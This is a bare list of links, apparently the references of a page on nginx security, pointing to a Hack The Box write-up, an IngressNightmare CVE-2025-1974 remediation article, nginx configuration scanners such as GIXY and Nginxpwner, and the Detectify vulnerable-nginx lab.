- [0xdf.gitlab.io — HTB Snapped Writeup](https://0xdf.gitlab.io/2026/04/01/htb-snapped.html)
- [GIXY Issue #115](https://github.com/yandex/gixy/issues/115)
- [IngressNightmare CVE-2025-1974](https://www.opswat.com/blog/ingressnightmare-cve-2025-1974-remote-code-execution-vulnerability-remediation)
- [gixy-ng](https://github.com/dvershinin/gixy)
- [Gixy-Next](https://gixy.io/)
- [GIXY](https://github.com/yandex/gixy)
- [Nginxpwner](https://github.com/stark0de/nginxpwner)
- [Detectify vulnerable-nginx Lab](https://github.com/detectify/vulnerable-nginx)
